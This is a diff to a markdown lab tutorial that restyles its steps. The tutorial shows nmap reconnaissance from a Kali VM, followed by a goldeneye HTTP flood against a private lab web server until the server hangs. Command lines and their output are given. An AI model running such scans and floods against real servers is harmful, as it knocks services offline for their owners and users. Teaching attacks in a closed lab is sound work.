@@ -45,13 +45,13 @@ From your laptop, use Firefox to access the HTTP server, `http://192.168.234.129
 Go back to Kali VM to plan, prepare and attack a victim.  
 
 **Recce phase**
-1. Where and what am I? (What is my IP?)  
+*1. Where and what am I? (What is my IP?)*  
 ```sh
 $ hostname -I
 192.168.234.128
 ```
 
-2. Who are around? (Select the victim)  
+*2. Who are around? (Select the victim)*  
 ```sh
 $ nmap 192.168.234.*
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 05:34 EDT
@@ -74,7 +74,7 @@ PORT   STATE SERVICE
 Nmap done: 256 IP addresses (3 hosts up) scanned in 2.87 seconds
 ```
 
-3. What are ALL the open ports of victim?
+*3. What are ALL the open ports of victim?*
 ```sh
 $ nmap -p- 192.168.234.129
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 05:35 EDT
@@ -87,7 +87,9 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 3.56 seconds
 ```
-4. Now start attacking the victim using `goldeneye`.  
+
+**Attack phase**
+*4. Now start attacking the victim using `goldeneye`.*  
 ```sh
 $ ./goldeneye.py http://192.168.234.129:8288 -w 50 -s 100 -d
 GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>
@@ -115,7 +117,7 @@ Starting worker Striker-51
 Starting worker Striker-50
 Starting worker Striker-49
 ```
-5. The HTTP server starts to display errors.  
+*5. The HTTP server starts to display errors.*  
 ```sh
 $ ./httpserver 
 2020/06/29 00:18:02 HTTP Server
@@ -149,5 +151,5 @@ $ ./httpserver
 ...
 ```
 
-6. From your laptop, use Firefox to re-access the HTTP server, `http://192.168.234.129:8288/hello`, it waits and hangs.  
+*6. From your laptop, use Firefox to re-access the HTTP server, `http://192.168.234.129:8288/hello`, it waits and hangs.*  
 
